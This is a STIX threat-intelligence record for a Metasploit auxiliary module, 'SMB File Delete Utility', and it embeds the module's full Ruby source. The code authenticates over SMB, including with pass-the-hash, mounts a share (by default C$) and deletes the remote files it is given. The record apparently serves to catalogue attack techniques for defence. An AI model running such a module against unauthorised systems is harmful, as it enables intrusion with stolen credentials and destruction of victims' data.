{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e56be50-4794-4a5f-8910-77d38126d51a",
    "created": "2024-08-14T16:24:19.631926Z",
    "modified": "2024-08-14T16:24:19.631929Z",
    "name": "SMB File Delete Utility",
    "description": "Q This module deletes a file from a target share and path. The usual reason to use this module is to work around limitations in an existing SMB client that may not be able to take advantage of pass-the-hash style authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/smb/delete_file.rb",
            "external_id": "delete_file.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::SMB::Client::RemotePaths\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  # Aliases for common classes\n  SIMPLE = Rex::Proto::SMB::SimpleClient\n  XCEPT  = Rex::Proto::SMB::Exceptions\n  CONST  = Rex::Proto::SMB::Constants\n\n\n  def initialize\n    super(\n      'Name'        => 'SMB File Delete Utility',\n      'Description' => %Q{\n        This module deletes a file from a target share and path. The usual reason\n      to use this module is to work around limitations in an existing SMB client that may not\n      be able to take advantage of pass-the-hash style authentication.\n      },\n      'Author'      =>\n        [\n          'mubix' # copied from hdm upload_file module\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of a share on the RHOST', 'C$'])\n    ])\n  end\n\n  def smb_delete_files\n    vprint_status(\"Connecting to the server...\")\n    connect()\n    smb_login()\n\n    vprint_status(\"Mounting the remote share \\\\\\\\#{datastore['RHOST']}\\\\#{datastore['SMBSHARE']}'...\")\n    self.simple.connect(\"\\\\\\\\#{rhost}\\\\#{datastore['SMBSHARE']}\")\n\n    remote_paths.each do |remote_path|\n      begin\n        simple.delete(\"\\\\#{remote_path}\")\n\n        # If there's no exception raised at this point, we assume the file has been removed.\n        print_good(\"Deleted: #{remote_path}\")\n      rescue Rex::Proto::SMB::Exceptions::ErrorCode, RubySMB::Error::RubySMBError => e\n        elog(\"Cannot delete #{remote_path}:\", error: e)\n        print_error(\"Cannot delete #{remote_path}: #{e.message}\")\n      end\n    end\n  end\n\n  def run_host(_ip)\n    validate_rpaths!\n\n    begin\n      smb_delete_files\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      elog('Unable to login', error: e)\n      print_error(\"Unable to login: #{e.message}\")\n    end\n  end\nend\n"
}